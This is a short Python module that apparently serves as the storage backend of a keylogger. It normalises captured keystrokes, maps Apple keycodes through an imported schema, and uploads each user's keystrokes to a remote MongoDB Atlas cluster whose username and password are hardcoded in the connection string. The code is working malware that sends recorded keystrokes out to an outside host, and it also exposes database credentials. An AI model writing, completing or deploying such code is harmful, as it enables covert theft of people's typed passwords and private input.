import pymongo
import apple_keycodes

cluster = pymongo.MongoClient("mongodb+srv://keylogger-test:test-keylogger@keylogger-test.vqheiq3.mongodb.net"
                              "/?retryWrites=true&w=majority")

mongo_db = cluster["database"]
keystrokes_collections = mongo_db["keystrokes"]


def insert(user, data):
    formatted_data = list(map(lambda key: key.replace('\n', ''), data))

    translated_data = list(map(
        lambda key: apple_keycodes.schema.get(key) if apple_keycodes.schema.get(key) is not None else key
        , formatted_data))

    entity = dict(user=user, data=translated_data)

    keystrokes_collections.insert_one(entity)


def get(user):
    return keystrokes_collections.find_one({"user": str(user)})
